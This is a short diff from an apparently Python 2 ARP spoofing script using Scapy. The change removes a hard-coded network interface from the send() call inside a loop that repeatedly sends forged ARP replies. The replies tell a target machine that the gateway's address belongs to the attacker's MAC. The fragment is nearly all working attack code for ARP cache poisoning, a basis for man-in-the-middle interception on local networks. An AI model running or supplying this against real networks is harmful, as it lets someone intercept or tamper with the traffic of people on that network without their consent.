@@ -15,7 +15,7 @@ arp = ARP(op=op, psrc=gateway, pdst=target_ip, hwsrc=attacker_mac, hwdst=target_
 print "Arp Spoof started.."
 try:
     while True:
-        send(arp, iface='en0')
+        send(arp)
         time.sleep(1)
 except KeyboardInterrupt:
     print "Arp spoof finished.."
